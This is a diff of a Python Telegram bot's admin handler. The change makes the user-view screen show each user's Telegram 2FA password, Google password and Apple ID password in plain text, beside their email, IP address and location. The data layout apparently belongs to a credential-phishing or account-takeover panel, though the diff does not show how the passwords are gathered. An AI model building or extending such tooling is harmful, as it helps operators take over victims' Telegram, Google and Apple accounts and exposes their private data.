@@ -710,15 +710,21 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
         else:
             email_line = f"📧 <b>Почта:</b> <code>{email}</code>\n"
 
-    pwd_line = ""
-    if pwd_2fa:
-        if is_apple_user:
-            pwd_line = f"🔑 <b>Пароль Apple ID:</b> <code>{pwd_2fa}</code>\n"
-        elif is_google_user:
-            pwd_line = f"🔑 <b>Пароль Google:</b> <code>{pwd_2fa}</code>\n"
-        else:
-            pwd_line = f"🔑 <b>Пароль (2FA):</b> <code>{pwd_2fa}</code>\n"
+    tg_pwd = user.get("telegram_2fa") or user.get("password_2fa")
+    goog_pwd = user.get("google_password")
+    app_pwd = user.get("apple_password")
 
+    pwd_lines = []
+    if tg_pwd:
+        pwd_lines.append(f"🔑 <b>2FA: Telegram:</b> <code>{tg_pwd}</code>")
+    if goog_pwd:
+        pwd_lines.append(f"🔑 <b>2FA: Google:</b> <code>{goog_pwd}</code>")
+    if app_pwd:
+        pwd_lines.append(f"🔑 <b>2FA: iOS:</b> <code>{app_pwd}</code>")
+    if not pwd_lines and pwd_2fa:
+        pwd_lines.append(f"🔑 <b>Пароль (2FA):</b> <code>{pwd_2fa}</code>")
+
+    pwd_line = ("\n".join(pwd_lines) + "\n") if pwd_lines else ""
     ip = user["ip"] if ("ip" in user.keys() and user["ip"]) else "—"
     country = user["country"] if ("country" in user.keys() and user["country"]) else ""
     city = user["city"] if ("city" in user.keys() and user["city"]) else ""
